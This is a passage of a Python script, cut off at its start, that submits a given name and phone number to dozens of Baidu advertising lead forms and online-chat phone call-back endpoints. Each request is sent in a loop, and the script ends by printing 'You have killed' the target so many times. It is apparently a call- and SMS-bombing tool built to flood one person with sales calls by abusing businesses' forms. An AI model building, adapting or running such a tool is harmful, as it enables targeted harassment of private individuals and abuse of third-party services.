ZFJ5H00uANv5gKW0AuY5H00TA6qn0KET1Ys0AFL5HDs0A4Y5H00TLCq0A71gv-bm1dsTzdMXh93XfKGuAnqiD4K0ZKCIZbq0Zw9ThI-IjY1nNt1nHwxnHb0IZN15HbYnWf4rHDdnjfsPj0krHbvrHc0ThNkIjYkPWnkPW0snHR1nHf30ZPGujdhmW79nAnkuW0snjD3m1Ph0AP1UHdawjnswR7DPbDkPHfLnj6z0A7W5HD0TA3qn0KkUgfqn0KkUgnqn0KbugwxmLK95H00XMfqn0KVmdqhThqV5HKxn7ts0Aw9UMNBuNqsUA78pyw15HKxn7ts0ZK9I7qhUA7M5H00uAPGujYs0ANYpyfqQHD0mgPsmvnqn0KdTA-8mvnqn0KkUymqn0KhmLNY5H00pgPWUjYs0A7buhk9u1Yk0Akhm1Ys0AwWmvfq0Zwzmyw-5H00mhwGujdDPDwArHTkrjn3PHnzwHD3wHf1PDNKnR7An1FafWwjfsKEm1Yk0AFY5Hn0Uv7YI1Ys0AqY5HD0ULFsIjYzc10WnznYc1mLnjTkPjR4PanLn163c1T1rj68nj0snj0sc1DWPansczYWna3snWm3PHRWna33nH0snj00XZPYIHY1nWDdrHTdP0KkgLmqna33rNtsQW0sg108njKxna3zPNtsQW0Yg108rH9xna3kn-ts0AF1gLKzUvwGujYs0ZFEpyu_myTqnsKWIWY0pgPxmLK95H00mL0qn0K-TLfqn0KWThnqPH0knjc&us=newvui&xst=mWdDPDwArHTkrjn3PHnzwHD3wHf1PDNKnR7An1FafWwjfs715HD3njb1P16LP16snHb3nj04rHD4g1czPNts0gTq_tMczeMl8lL2lUXC_r0KTHL2lUXC0gRqn1ckPHbLPHfKIjYkPWnkPW0snHR10ydk5H0an0cV0yPC5yuWgLKW0ykd5H0Kmv3qmh7GuZRKnH6snWmvn1RYns&word=&ck=6026.8.113.499.179.548.419.75&shh=www.baidu.com&sht=baidu&wd=&bc=110101"
            }
        }
                },
        {
            "url": "https://jzapi.baidu.com/rest/form/c/sessions/2c7a46fd07034a02bb717039c3ff3ae7/submissions?reqid=4b534c47-cf6d-40e6-11ff-{}".format(now),
            "data": {
            "input": [{
                "code": "rJjG",
                "value": "{}".format(n),
                "name": "姓名",
                "type": "name"
            }, {
                "code": "DyPO",
                "value": "{}".format(t),
                "name": "电话",
                "type": "phone"
            }, {
                "code": "Rmgo",
                "value": "北京市,北京市,北京北方瑞迪汽车服务有限公司",
                "name": "经销商",
                "type": "linkage"
            }],
            "action": {
                "show_type": 0,
                "action_prod": 2,
                "tuoguan_page_id": 86071948,
                "tuoguan_site_id": 57348782,
                "tuoguan_app_id": 269,
                "tuoguan_pv_id": "163160041646411757048",
                "exp_ids": "49794-dz_74889-1_69059-1_74098-1_55294-1_72527-1_72440-dz_54210-1_62230-1_54211-dz_74324-dz_73350-1_69002-dz_70146-dz_70213-2_74539-1_73210-dz_60975-1_74840-1_73315-1_49904-1_53921-dz",
                "page_url": "https://aisite.wejianzhan.com/site/wjz8skwx/ad189c9b-8e66-40eb-bd22-5883e0ee7541?showpageinpc=1&timestamp={}".format(now),
                "abtest_url": "",
                "use_history_info": True
            },
            "ba_hector": "2h251aodkknu1gk0fpt0d",
            "ad_trace": {
                "fid": "",
                "anti_code": "https://aisite.wejianzhan.com/site/wjz8skwx/ad189c9b-8e66-40eb-bd22-5883e0ee7541?gsadid=gad_579_pg7xn20p"
            },
            "_embedded": {
                "session": {
                    "version": -1,
                    "solution_id": 13440440,
                    "scene_code": "wwpxee",
                    "user_id": 34489757
                }
            }
        }
        },
        {
            "url": "https://jzapi.baidu.com/rest/form/c/sessions/b92655d93b724947acde4930dc2e45f7/submissions?reqid=4b534c47-2cba-42d3-8055-{}".format(now),
            "data":{
            "input": [{
                "code": "gpFo",
                "value": "{}".format(n),
                "name": "姓名",
                "type": "name"
            }, {
                "code": "NEAg",
                "value": "{}".format(t),
                "name": "电话",
                "type": "phone"
            }, {
                "code": "mxDu",
                "value": "宋经典版",
                "name": "车型",
                "type": "linkage"
            }, {
                "code": "XqFS",
                "value": "北京市,北京市,北京鑫敏恒金朝汽车销售有限公司",
                "name": "经销商",
                "type": "linkage"
            }],
            "action": {
                "show_type": 0,
                "action_prod": 2,
                "tuoguan_page_id": 72952359,
                "tuoguan_site_id": 56020140,
                "tuoguan_app_id": 269,
                "tuoguan_pv_id": "163160073985113901488",
                "exp_ids": "65247-1_70213-dz_72913-dz_69059-1_55294-1_72527-1_72440-dz_54210-1_62230-1_73210-1_74324-dz_72757-dz_73350-1_70146-dz_74539-dz_74840-1_69002-1_53921-dz",
                "page_url": "https://aisite.wejianzhan.com/site/wjzo93cx/1b58935b-0a05-4f40-9668-86afb7180cb4?showpageinpc=1&timestamp={}".format(now),
                "abtest_url": "",
                "use_history_info": True
            },
            "ba_hector": "8kal5o3b5hfn1gk0g4c0d",
            "ad_trace": {
                "fid": "",
                "anti_code": "https://aisite.wejianzhan.com/site/wjzo93cx/1b58935b-0a05-4f40-9668-86afb7180cb4?gsadid=gad_579_dntvsrbi"
            },
            "_embedded": {
                "session": {
                    "version": -1,
                    "solution_id": 13366029,
                    "scene_code": "wwpxee",
                    "user_id": 33673763
                }
            }
            }
        },
        {
            "url": "https://jzapi.baidu.com/rest/form/c/sessions/3e7a537f41354e02baca7406b430d187/submissions?reqid=4b534c47-a628-4032-4139-{}".format(now),
            "data": {
            "input": [{
                "code": "HgrT",
                "value": "{}".format(n),
                "name": "称呼",
                "type": "name"
            }, {
                "code": "DOdm",
                "value": "{}".format(t),
                "name": "电话",
                "type": "phone"
            }, {
                "code": "xKfF",
                "value": "东风风神奕炫MAX",
                "name": "车型",
                "type": "linkage"
            }, {
                "code": "haRX",
                "value": "江西,南昌,南昌风和:青山湖区火炬二路1111号",
                "name": "经销商",
                "type": "linkage"
            }],
            "action": {
                "show_type": 0,
                "action_prod": 2,
                "tuoguan_page_id": 88004625,
                "tuoguan_site_id": 57580822,
                "tuoguan_app_id": 269,
                "tuoguan_pv_id": "163160093899318448816",
                "exp_ids": "72913-dz_72527-dz_72440-1_69059-1_55294-1_68586-dz_70146-4_73242-dz_62230-1_54210-dz_53921-1_73350-1_70213-2_60975-1_74840-1_74098-dz_73315-1_73708-1_67560-1_65247-dz_ab_wildcard_dyn-2",
                "page_url": "https://aisite.wejianzhan.com/site/wjzqibsx/ae350669-d88d-4fc8-b82a-d59708fdf4f1?showpageinpc=1&timestamp={}".format(now),
                "abtest_url": "",
                "use_history_info": True
            },
            "ba_hector": "040165fh0mq81gk0gbf0d",
            "ad_trace": {
                "fid": "",
                "anti_code": "https://aisite.wejianzhan.com/site/wjzqibsx/ae350669-d88d-4fc8-b82a-d59708fdf4f1?ctrmi=1007403E33"
            },
            "_embedded": {
                "session": {
                    "version": -1,
                    "solution_id": 13402105,
                    "scene_code": "wwpxee",
                    "user_id": 34361114
                }
            }
        }
        },
        {
            "url": "https://leads.baidu.com/rest/form/c/sessions/null/submissions",
            "data": {
            "input": [{
                "code": "QbSY",
                "value": "{}".format(n)
            }, {
                "code": "hRdG",
                "value": "{}".format(t)
            }],
            "ad_trace": {
                "anti_code": "http://www.baidu.com/baidu.php?url=K60000Kb2CcYyPB3La9nsrVX-NZGzyk2B-zzbIr5n8a3lecpBGVHTbmM6809ltS3dWG2t6oIPfl-ux6GlHo-7QSW4bBjAmDlcEOQtaswdnAio1QZXw_AgimXy76FGb2AzMod5ptppVe5Nm_Qf4h3b-GKFjLF30h0ff_D3KayILDuhaPpc8HHDUs3x6zhuTwBTlm3DBoLuoUeHZmRvbADTTwvqfHs.7b_NR2Ar5Od66uxAS6Mz3D4g_kTPHniccLYDsTAg9JEerj6688tT-qSkrIMIu34S1Fbzuq-tnrXSAV-MubLdqhEILd3hcEL3JO1xVLqE4JeOCBoYqM4Je2O1xVvgHuIOw7SLjIJoSgyAGW_lLltHA8OKqXazZOsuU2ZO6__oO3ZoSXSzzU4yypO4A5OsUEqxO6qESdZ-SEHZuum1ohztxYZvyyyypePy814NOe5S1J3xgOuOPOkxtgwbO5Sxl59WOZOuOdSXgGOgSxqO4TngQWqMODMqXye9oOxOeDNg_OeZ_zOMIOkUVXzWSLOo4x-sd_qbi-muCynMWgvUd0.U1Yk0ZDq1UUgz6Kspynqn0KY5TvvdtC0pyYqnWcd0ATqUvNsT1D0Iybqmh7GuZR0TA-b5Hf0mv-b5Hb10AdY5HfsPWKxnH0kPdtknjD40AVG5HD0TMfqn1Rd0AFG5HDdPNtkPH9xnW0Yg1ckPdtdnjn0Uynqn1nsrHf1rHm4n-tkrHDsnHT3rHm1g100TgKGujYs0Z7Wpyfqn0KzuLw9u1Ys0A7B5HKxn0K-ThTqn0KsTjYs0A4vTjYsQW0snj0snj0s0AdYTjYs0AwbUL0qn0KzpWYs0Aw-IWdsmsKhIjYs0ZKC5H00ULnqn0KBI1Ykn0K8IjYs0ZPl5fK9TdqGuAnqTZnVuLGCXZb0pywW5R9rffKspZw45fKYmgFMugfqPWPxn7tkPH00IZN15HTLnWfznWmznWcknWRdn16knHf0ThNkIjYkPWnkPW0knHf1n1n30ZPGujdBrH63uARsm10snjDsuWKW0AP1UHdawjnswR7DPbDkPHfLnj6z0A7W5HD0TA3qn0KkUgfqn0KkUgnqn0KbugwxmLK95H00XMfqn0KVmdqhThqV5HKxn7ts0Aw9UMNBuNqsUA78pyw15HKxn7ts0ZK9I7qhUA7M5H00uAPGujYs0ANYpyfqQHD0mgPsmvnqn0KdTA-8mvnqn0KkUymqn0KhmLNY5H00pgPWUjYs0A7buhk9u1Yk0Akhm1Ys0AwWmvfq0Zwzmyw-5H00mhwGujdDPDwArHTkrjn3PHnzwHD3wHf1PDNKnR7An1FafWwjfsKBIjYs0Aq9IZTqn0KEIjYk0AqzTZfqnBnsc1nWPanLPjmsnjD3n1DWPWnsnj0WPHnsnj08nj0snj0sc1nWPansczYWna3snHmvnjcWni3krHbznj00XZPYIHY1nW61PjTLr0KkgLmqna31PNtsQW0sg108njKxna3vn7tsQW0dg108rj9xna3kn7ts0AF1gLKzUvwGujYs0ZFEpyu_myTqnfKWIWY0pgPxmLK95H00mL0qn0K-TLfqn0KWThnqPWnzn0&us=newvui&xst=mWdDPDwArHTkrjn3PHnzwHD3wHf1PDNKnR7An1FafWwjfs715HD1n1m4nHT4PWnvrHTsn1msPH63g1czPNts0gTq1UUgz67k5TvvdtCKIHY1nW61PjTLr07Y5HDvn1DvnjDkPjnKUgDqn0cs0BYKmv6quhPxTAnKUZRqn07WUWdBmy-bIfDkPjTsn1RvPj63&word=",
                "searchid": "b988de0c00010f0c",
                "cmatch": 225,
                "rank": 0
            },
            "_embedded": {
                "session": {
                    "solution_id": 13426486,
                    "scene_code": "lpgrjs"
                }
            }
        }
                },
        {
            "url": "https://jzapi.baidu.com/rest/form/c/sessions/483dd3f2ce1a453fab0d663c9b2db6e8/submissions?reqid=4b534c47-0b43-419e-47a5-{}".format(now),
            "data": {
            "input": [{
                "code": "ZXqO",
                "value": "{}".format(n),
                "name": "称呼",
                "type": "name"
            }, {
                "code": "TiDG",
                "value": "{}".format(t),
                "name": "电话",
                "type": "phone"
            }],
            "action": {
                "show_type": 0,
                "action_prod": 2,
                "tuoguan_page_id": 84737348,
                "tuoguan_site_id": 57140175,
                "tuoguan_app_id": 269,
                "tuoguan_pv_id": "163160128431318480734",
                "exp_ids": "65247-1_74889-dz_72913-dz_74657-dz_72527-dz_69059-1_55294-1_60975-dz_70213-1_74348-dz_62230-1_73210-1_54211-dz_72757-dz_53921-1_73350-1_73315-dz_74840-1_73708-1_67560-1_74967-dz_73519-dz_74492-1_ab_wildcard_dyn-2",
                "page_url": "https://aisite.wejianzhan.com/site/wjzhb4ww/546ff8ca-cd71-49be-87b7-80e2d8cb4a9b?showpageinpc=1&timestamp={}".format(now),
                "abtest_url": "",
                "use_history_info": True
            },
            "ba_hector": "a000ckp32s911gk0gla0c",
            "ad_trace": {
                "fid": "",
                "anti_code": "https://aisite.wejianzhan.com/site/wjzhb4ww/546ff8ca-cd71-49be-87b7-80e2d8cb4a9b?fid=nHn1PWbkP1bvn1m4P101PW0drj9xnWcdg1n&ch=4&bfid=fbuFw0cKj0tK001XBQb00rD00sZpK5RKncJVffs000j88t0Pi00000f0gf0D1UUgzBgNY_vvdtogeVjaYtyeLIj71lcVVXreqtLzEtUAETzCdtMwoejFdLzow0"
            },
            "_embedded": {
                "session": {
                    "version": -1,
                    "solution_id": 11841170,
                    "scene_code": "wwpxee",
                    "user_id": 32834778
                }
            }
        }
        },
        {
            "url": "https://jzapi.baidu.com/rest/form/c/sessions/a93f9403879843daaf823c3e7f9a8378/submissions?reqid=4b534c47-01ff-4808-90c4-{}".format(now),
            "data": {
            "input": [{
                "code": "mhEE",
                "value": "其他法律问题",
                "name": "您所遇到的法律问题？",
                "type": "multiselect"
            }, {
                "code": "MaIs",
                "value": "{}".format(n),
                "name": "您的姓名",
                "type": "name"
            }, {
                "code": "RIbu",
                "value": "{}".format(t),
                "name": "您的电话",
                "type": "phone"
            }],
            "action": {
                "show_type": 0,
                "action_prod": 2,
                "tuoguan_page_id": 63862871,
                "tuoguan_site_id": 54719002,
                "tuoguan_app_id": 269,
                "tuoguan_pv_id": "163160152062518194824",
                "exp_ids": "74889-1_67560-dz_49795-dz_72913-dz_69059-1_74098-1_70213-1_62230-1_73210-1_54210-dz_53921-1_73708-dz_73519-1_65247-1_72440-1_55294-1_72527-1_72757-1_54211-dz_73350-1_69002-dz_60975-1_74840-1_50632-dz_73315-1_49904-1",
                "page_url": "https://aisite.wejianzhan.com/site/shenyuanlvshi.com/0904d77c-7702-4842-b240-45d9924d605d?showpageinpc=1&timestamp={}".format(now),
                "abtest_url": "",
                "use_history_info": True
            },
            "ba_hector": "0ka1eqdbmn0v1gk0gt20d",
            "ad_trace": {
                "fid": "",
                "anti_code": "https://aisite.wejianzhan.com/site/shenyuanlvshi.com/0904d77c-7702-4842-b240-45d9924d605d?fid=nHfYP10LPHnznWTsnjRvPW6znHwxnWcdg1f&ch=4&bfid=fbuFw0cKIJ_a0AwkY_600rD0K07JkI0K-ChNZ0C0000at7HxQ60000f0gf0Ds_M2GBOFeVEp8XrvJtM8vqoazTJhQIHp1qOj3oxwdtMwozEn3UhGsS2LYUXCs_hLEUa3cNAyKWC&bd_vid=nHfYP10LPHnznWTsnjRvPW6znHwxnWcdg1wxnH0s&sdclkid=AL2s152iArD6A5epxOo"
            },
            "_embedded": {
                "session": {
                    "version": -1,
                    "solution_id": 2849774,
                    "scene_code": "wwpxee",
                    "user_id": 30459242
                }
            }
        }
        },
        {
            "url": "https://jzapi.baidu.com/fengming-c/clue-audit/risk/lp-submit/expose?reqid=4b534c47-dcac-46b2-0dac-{}".format(now),
            "data":{
            "clueJoinId": "210914164765645989",
            "userId": 32463774,
            "solutionId": 7654605,
            "solutionType": "form",
            "lpInfo": {
                "appId": 269,
                "siteId": 55214473,
                "pageId": 67252784,
                "lpUrl": "https://isite.baidu.com/site/wjzvi8ow/86d5c8bd-5bee-451c-9ac5-eacf3d357feb?qd=pcbdjj&zh=10&zh=S05?DLJZ-01621&fid=nHcLnHf1Pj0srHRznjDvPHTdPj7xnWcdg1f&ch=4&bfid=fbuFw0cKkRc005wCTo000rD0K0AXyStKaJR8kf_000alpMA0ff0000f0gf0D8SAtk9Je3U1A8pEQEBvzk_ekEnxNzzLjqtQo_XJtvOBejhC&bd_vid=nHcLnHf1Pj0srHRznjDvPHTdPj7xnWcdg1wxnH0s&bd_vid=10250897690497905994"
            },
            "clueInfo": {
                "formControls": [{
                    "name": "称呼",
                    "value": "{}".format(n),
                    "type": "name"
                }, {
                    "name": "电话",
                    "value": "{}".format(t),
                    "type": "phone"
                }],
                "captcha": {
                    "type": "no",
                    "phoneNo": "{}".format(t)
                }
            },
            "clientInfo": {},
            "adInfo": {
                "referrer": "https://www.baidu.com/baidu.php?url=K60000avpXkFvm720r-VDT_iH4njsgiXfaYDBgUC9Wf7I639DWf_FIyVHF_6rv7vbad-KCn4J6DWB7iCMbzOLVn0jE0pSoT3SPD7EtjU0dM9fKwxQFlzXg4BBu0cYGEc668PJlno4IeiUwdTf5FjJAE7_KNLnYp5PUwl-tOYDYOAnHThKpfsIat7mZmh356A5Fmh3mewcSmAIgVWl8znKZygIKor.7D_NR2Ar5Od66xAS6MzEukmDfwECF63nEjqjqW8ajuYLUCI-qvxIX-rx_LNs4qenrer-hZgk83eEZyhOEeQhnTPqvgQd3ph2erEjRkSPheEtEdOegtW5ugY42S8EDk7SOjS8QqOggSUQuZPSOOo3m_EzSWtLeOl7L4_EWYwxVsLpJqxyAGW_lLltHA8OKqXazZOsIES8Az1IsxjS6lzzzU4yxSa1vOtjwSPjOsnOegSEuvlSyzzkhWWOBXv1go____dvpVIMzvxWepZUEOvbtxqhEvenxMSx1qxC3XL-HvSTgwSg93xd4xufOre-O3ZSdfSWSWlGzdxjdE84xCknwxEsOoBOxddOhzvw1xEOlSAQQtECOPSOS9ISUQ3qDgeTPvJE6lcELecd2s1f_N4rPX4f.U1YY0ZDq8SAtk6KspynqnfKsTv-MUWYdrAP9uAfvPhR3nHDLmyf3m1DsmWD4Pjw9PH0dmHTzu0KY5UE9Enp4Jt8S0A-V5HczPfKM5gK1IZc0Iybqmh7GuZR0TA-b5Hf0mv-b5Hb10AdY5HDsnHIxnW0vn-tknjD40AVG5H00TMfqn1Rd0AFG5HDdPNtkPH9xnW0Yg1ckPdtdnjn0UynqnHbsrHfsPHfYP7tkg100TgKGujYs0Z7Wpyfqn0KzuLw9u1Ys0A7B5HKxn0K-ThTqn0KsTjYs0A4vTjYsQW0snj0snj0s0AdYTjYs0AwbUL0qn0KzpWYs0Aw-IWdsmsKhIjYs0ZKC5H00ULnqn0KBI1Ykn0K8IjYs0ZPl5fK9TdqGuAnqujDkQyIlpZ940A-bm1dcHbD0TA9YXHY0IA7zuvNY5Hnkg1nkP7tknHD0IZN15HTvrHb4n1T1rjD3n1nkPWcdrjm0ThNkIjYkPWnkPW0kP1DkPW0s0ZPGujdBnjTzPW9hPj0snj0Ynhnd0AP1UHdawjnswR7DPbDkPHfLnj6z0A7W5HD0TA3qn0KkUgfqn0KkUgnqn0KbugwxmLK95H00XMfqn0KVmdqhThqV5HKxn7ts0Aw9UMNBuNqsUA78pyw15HKxn7ts0ZK9I7qhUA7M5H00uAPGujYz0ANYpyfqPWf0mgPsmvnqn0KdTA-8mvnqn0KkUymqn0KhmLNY5H00pgPWUjYs0A7buhk9u1Yk0Akhm1Ys0AwWmvfq0Zwzmyw-5H00mhwGujdDPDwArHTkrjn3PHnzwHD3wHf1PDNKnR7An1FafWwjfsKEm1Yk0AFY5HD0Uv7YI1Ys0AqY5HD0ULFsIjYzc10WnHbWnznLnjn4PjR4rjcWnHfsnj0WnHfsnj08nj0snj0sc1nWnznsc1DLc108njfvn1Dvc1D8nj0snH0s0Z91IZRqn1cYPWnLP1f0TNqv5H08n1Ixna3sn7tsQW0sg108PWwxna3sP-tsQWb4g108njIxn0KBTdqsThqbpyfqn0KzUv-hUA7M5H00mLmq0A-1gvPsmHYs0APs5H00ugPY5H00mLFW5Hm4P16&us=newvui&xst=mWdDPDwArHTkrjn3PHnzwHD3wHf1PDNKnR7An1FafWwjfs715HDzP1DYn1fsnjbdnW0kPWRLPHfkg1czPNt10gTq8SAtkohoze3KTHve3U1A0gRqn1cYPWnLP1fKIjYkPWnkPW0kP1Dz0ydk5H0an0cV0yPC5yuWgLKW0ykd5H0Kmv3qmh7GuZRKnHRzPHcdnW6sns&cegduid=n1cYPWnLP1f&solutionId=12043559&word=&ck=5223.31.145.341.338.474.148.97&shh=www.baidu.com&sht=baidu&wd=&bc=110101"
            }
        }
        },

    ]

    return noise


async def get_data_list_get(n, t):
    now = ftime.get_timestamp()
    noise = [
        {
            "url": "http://www14c1.53kf.com/impl/rpc_callback_phone.php?from=api&company_id=72204003&guest_id=10928337502000&style=1&from_page=https%3A%2F%2Fwww.baidu.com%2Fbaidu.php%3Furl%3Daf0000KpxzUee8WytAUB9iG8DN4YrbxdHedSMs0KqyiD7nltNSdCAZygAiDIdIRPiU7fcgbi0jBs9AMejC5gVmf7-Z0lk2Cc6ejc3shlHsmFBB8OLu4lW_X6fThi4--wvC5Bgyymw2st5V9IjvN2dpEN5srQuNL1nyHTukNSMZ0H8O4VJOY-1F8lk0NTON_8m-ZQXnxni2iYsqw7gBZEnnJItLgf.7D_a59JsntPHYLmDfuQn-MPi_nYQZHklIhwf.U1Yz0ZDqkXjwVfKspynqn0KsTv-MUWdhnW6Ln1R3PWmdPWcdPjT4rAf3nWm3ryDknjD3PHFBr0KY5T5L_evq1P5qkXjwVfKGUHYznWR0u1dEuZCk0ZNG5yF9pywd0ZKGujYY0APGujY4nsKVIjYknjD4g1DsnHIxnW0vn6KopHYs0ZFY5Hn3P6KBpHYkPHNxnHR3g1csP7tznHIxPH010AdW5HD3n1ndn1T3P19xnHbknHfvn1TvnNtzPjnsPHnvnHf1nsKkTA-b5H00TyPGujYs0ZFMIA7M5H00mycqn7ts0ANzu1Ys0ZKs5H00UMus5H08nj0snj0snj00Ugws5H00uAwETjYs0ZFJ5H00uANv5gKW0AuY5H00TA6qn0KET1Ys0AFL5HDs0A4Y5H00TLCq0A71gv-bm1dsTzdMXh410A-bm1dcHbc0TA9YXHY0IA7zuvNY5Hnkg1nkP7tknHD0IZN15HDznjf4PW6krj0dnWbvrHcsPW6v0ZF-TgfqnHm1nH0sPWckP1D1r0K1pyfquWfLnjIBmyDsnj0kPWT1u0KWTvYqfYDvrH0krjD3nYR1wHRYfsK9m1Yk0ZK85H00TydY5H00Tyd15H00uANYgvPsmHYs0ZGY5H00UyPxuMFEUHYsg1Kxn0Kbmy4dmhNxTAk9Uh-bT1Ysg1Kxn0Ksmgwxuhk9u1Ys0AwWpyfqn0K-IA-b5iYk0A71TAPW5H00IgKGUhPW5H00Tydh5H00uhPdIjYs0A-1mvsqn0K9uAu_myTqnfK_uhnqn0KbmvPb5fKYTh7buHYs0AFbpyfqrjfvrRDdwbDdnbR3fH9jwb7An1T1rRFDPHc4nDn3fWb0UvnqnfKBIjY10Aq9IZTqn0KEIjYk0AqzTZfqnBnsc1DLc1nWP1RzPjndPj64c1cknj0sc1cknj0sQW0snj0snankc1nWnanVc108nj0snH0sc1D8njf3nj0s0Z91IZRqnW6Lnj0dPHD0TNqv5H08PWuxna3sn7tsQW0sg108PWNxna3sr7tsQW6Lg108nW9xn0KBTdqsThqbpyfqn0KzUv-hUA7M5Hf0mLmq0A-1gvPsmHYs0APs5H00ugPY5H00mLFW5HD1nW6%26us%3Dnewvui%26xst%3DmWY3Pjm4fHNAfHRzwH9KrDPAfRm1P1n4fbfdnWbsf19arf715HDLPWD1P1DYnHDzP1csP1R3PH64g1czPNtk0gTqsOX1EULnYOL73PAd0gDqkXjwVf7d5Hc3P10sPHRk0gfqnHm1nH0sPWckPs7VTHYs0W0aQf7Wpjdhmdqsms7_IHYs0yP85yF9pywd0HDznWDsrjRLPWc%26word%3D%26ck%3D1365.17.120.390.290.300.141.786%26shh%3Dwww.baidu.com%26sht%3Dbaidu%26wd%3D%26bc%3D110101&talk_page=http%3A%2F%2Fwww.szhuazhiedu.com%2F2020.html%3Fbd_vid%3D11269317978045014641&land_page=http%253A%252F%252Fwww.szhuazhiedu.com%252F2020.html%253Fbd_vid%253D11269317978045014641&call={}&id6d=10337911,10396889&worker_id=".format(t)
        },
        {
            "url": "https://dft.zoosnet.net/lr/sendnote160711.aspx?tel={}&ccode=&id=DFT98123122&sid=aec12325f90c4e728e3fbc7480ce318e&cid=aec12325f90c4e728e3fbc7480ce318e&lng=cn&p=http%3A//www.blackcgart.cn/&e=&un=&ud=&on=&d={}".format(t, now),
            "headers": {"Content-Type": "text/html;charset=UTF-8"}
        },
        {
            "url": "https://dct.zoosnet.net/lr/sendnote160711.aspx?tel={}&id=DCT79250668&sid=634e9a808f224f999e722cf53e3514ba&cid=634e9a808f224f999e722cf53e3514ba&lng=cn&p=http%3A//www.feifei12.com/%3Fsdclkid%3DAL2s152iArD6A5FpxOo%26bd_vid%3D9934511552804527965&e=%25u6765%25u81EA%25u9996%25u9875%25u7684%25u5BF9%25u8BDD&un=&ud=&on=&d={}".format(t, now)
        },
        {
            "url": "https://api.public.hxsd.com/app/webcall?phone_num={}&referrerUrl=https://www.baidu.com/baidu.php?url=0f00000uEDLSpLgiCMvO0pwHVBbNqMO5OVf_6Fblm-sPpil60VHcqw6DALnl4bqw-9I_78BL1o0kI8ESlBNw-G7raaLaQJ_SEtHQnbltyfHkqoEQibQDFpQm_K9j-K_6A28lNxh-VLt4ZIwVvcM8FpZBCeFaN3hRDlK-AOjI7Ogi1RmTgYEDLgUtG2wrScHJgus0vJSm0I7r5831qNF24nzER7Fe.7Y_iwYn7vWzJlcebfmZsF8sTPajFub_ozurr5HZ-6es_lTUQqRHZyqM76ksqIgjdJYqUt8XoCW8_3qX8g9CtEUsgnTpt-xH_lISO_3qMgQsYXyA9qjAeFkePh1xblxZ_l4XAWzsdnNdqTEjw4ympj7I-hOk3qMHdztPZ-9klh2SMIELUqOukl4XAWz_LmvrhEWELIhi1u_l4XAWzkYPjAH_l4XAWzLxfkgdW89Cq8FWvOozwde_WOUPt8MveEoWl5lQ-2s1f_U81WbLJ.U1YY0ZDqdojiVUMh8l30TA-W5H00IjLAET5hzXBtk_Wqkroy_P2d8Xpeo6KGUHYznWR0u1dEugK1nfKdpHdBmy-bIfKspyfqP0KWpyfqrHn0UgfqnH0krNtknjDLg1csPH7xn10sPdtknjmk0AVG5H00TMfqPjTY0AFG5HDdPNtkPH9xnW0Yg1ckPdtdnjn0UynqnH6vnWbdP103r7tkrH04njm1P10zg1csPH7xnH0zg1Dsn6KkTA-b5H00TyPGujYs0ZFMIA7M5H00mycqn7ts0ANzu1Ys0ZKs5H00UMus5H08nj0snj0snj00Ugws5H00uAwETjYk0ZFJ5H00uANv5gKW0AuY5H00TA6qn0KET1Ys0AFL5HDs0A4Y5H00TLCq0A71gv-bm1dsTzdMXh93XfKGuAnqiD4K0ZKCIZbq0Zw9ThI-IjY1nNt1nHwxnHb0IZN15HDsn1f3P1nYrjndnjT3rHbdP160ThNkIjYkPWnknH6sPHn1rHTY0ZPGujdBPvnYujKbuH0snjRznHm10AP1UHYdwHRYrHmknRR1wj7jPDwa0A7W5HD0TA3qn0KkUgfqn0KkUgnqn0KlIjYs0AdWgvuzUvYqn7tsg1Kxn7ts0Aw9UMNBuNqsUA78pyw15HKxn7tsg1RsPjRznW9xPH0YPHczr0Ksmgwxuhk9u1Ys0AwWpyfqn0K-IA-b5iYk0A71TAPW5H00IgKGUhPW5H00Tydh5H00uhPdIjYs0A-1mvsqn0K9uAu_myTqnfK_uhnqn0KbmvPb5fKYTh7buHYvP10dnjn0mhwGujYkPWDkrjwDf1warRR1rHfsnjmYP1FDfRnvwH6sPjnkPsKEm1Yk0AFY5Hn0Uv7YI1Ys0AqY5HD0ULFsIjYzc10WnHbWnznLrjDzrHTznW0Wn1Rsnj0Wn1Rsnj08nj0snj0sc1nWnznsc1D3c108nj0snH0sc1D8nj0snH0s0Z91IZRqnH0srHT1Pjm0TNqv5H08n1Kxna3sn7tsQW0sg108PWuxna3sP7tsQWbdg108njKxnHc30AF1gLKzUvwGujYs0ZFEpyu_myTqnsKWIWY0pgPxmLK95H00mL0qn0K-TLfqn0KWThnqnHn3PHc%26us=newvui%26xst=mWYkPWDkrjwDf1warRR1rHfsnjmYP1FDfRnvwH6sPjnkPs715HD1nWfkrHn3PjRvnWTLP1RYnWDkg1czPNt10gTqkoLj4_MCEnUcOTHJdojiVUMh8l3KTHLy_P2d8Xpeo67d5HDsnjbLn1fv0gfqnHm1nHD3njR1P07VTHYs0W0aQf7Wpjdhmdqsms7_IHYs0yP85yF9pywd0HnsPWcLP1TzPj6%26word=%26ck=7643.35.130.448.306.527.316.238%26shh=www.baidu.com%26sht=baidu%26wd=%26bc=110101&curUrl=https://study.hxsd.com/ui/eduzt/20201223pmsj/?campaign=%26baidupc%26gz%26hm%26bj-hxsd03%26%26jzl_kwd=312168699434%26jzl_ctv=52348892674%26jzl_ch=11%26jzl_act=10097346%26jzl_cpg=165959943%26jzl_adp=6139542088%26jzl_sty=24%26jzl_dv=1%26sdclkid=AL2s152iArD6A5FpxOo%26bd_vid=11841237583907036847".format(t)
        },
        {
            "url": "https://ala.zoosnet.net/lr/sendnote160711.aspx?tel={}&id=ALA53657662&sid=f6a7a717aa074facaba218329fae89d2&cid=f6a7a717aa074facaba218329fae89d2&lng=cn&p=http%3A//chyy.cnwlxh.cn/pc3/%3Fbdpc-8/5-15094%26bd_vid%3D10844056232036964004&e=&un=&ud=&on=&d={}".format(t, now)
        }

    ]
    return noise


async def send(name=None, tel=None):
    if not (name or tel):
        return "请输入：n t"
    headers = {"Content-Type": "application/json",
               "X-Fengming-Consumer-Code": "liteua"
               }
    _noise = await get_data_list_get(name, tel)
    for index, no in enumerate(_noise):
        print(index)
        url = no.get("url")
        try:
            ret = await _get.send(url, fmt='text', headers=headers if not no.get("headers") else {})
            print(ret)
        except Exception as e:
            print(e)

    noise = await get_data_list_post(name, tel)
    for index, no in enumerate(noise):
        print(index)
        url = no.get("url")
        data = no.get("data")
        try:
            ret = await _post.send(url, json.dumps(data, ensure_ascii=False),
                             headers=headers if not no.get("headers") else headers.update(no.get("headers")))
            print(ret)
        except Exception as e:
            print(e)
    print('You have killed {} {} {} times!'.format(name, tel, len(noise) + len(_noise)))


def run_async(future):
    loop = asyncio.get_event_loop()
    res = loop.run_until_complete(future)
    return res







